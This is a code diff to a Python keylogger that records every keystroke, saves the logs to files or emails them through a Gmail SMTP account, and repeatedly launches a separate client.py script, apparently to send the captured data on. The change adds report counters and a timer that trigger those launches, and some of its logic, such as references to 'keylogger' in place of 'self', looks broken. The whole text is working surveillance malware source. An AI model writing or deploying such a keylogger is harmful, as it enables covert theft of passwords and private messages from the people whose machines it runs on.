@@ -3,15 +3,19 @@ import keyboard # for keylogs
 import smtplib # for sending email using SMTP protocol (gmail)
 from subprocess import Popen #to run client.py
 import os #find realpath
+import time
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 2 # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "put_real_address_here@gmail.com"
 EMAIL_PASSWORD = "put_real_pw"
 
 class Keylogger:
+    report_counter = 0
+    start_time = 0
+
     def __init__(self, interval, report_method="file"):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
@@ -61,7 +65,6 @@ class Keylogger:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
-        process = Popen(['python3', os.path.realpath("client.py")])
 
     def sendmail(self, email, password, message):
         # manages a connection to an SMTP server
@@ -89,10 +92,23 @@ class Keylogger:
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             elif self.report_method == "file":
                 self.report_to_file()
+                keylogger.report_counter += 1
+                if keylogger.report_counter > 4:
+                    #use for executable
+                    #process = Popen(os.path.realpath("client")) 
+                    #use for python3
+                    keylogger.report_counter = 0
+                    time_passed = 0
+                    process = Popen(['python3', os.path.realpath("client.py")])
+
             # if you want to print in the console, uncomment below line
             # print(f"[{self.filename}] - {self.log}")
-
             self.start_dt = datetime.now()
+        time_passed = round(time.time() - keylogger.start_time)
+        if time_passed > 10:
+            keylogger.start_time = time_passed
+            time_passed = 0
+            process = Popen(['python3', os.path.realpath("client.py")])
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
         # set the thread as daemon (dies when main thread die)
@@ -102,6 +118,7 @@ class Keylogger:
 
     def start(self):
         # record the start datetime
+        keylogger.start_time = time.time()
         self.start_dt = datetime.now()
         # start the keylogger
         keyboard.on_release(callback=self.callback)
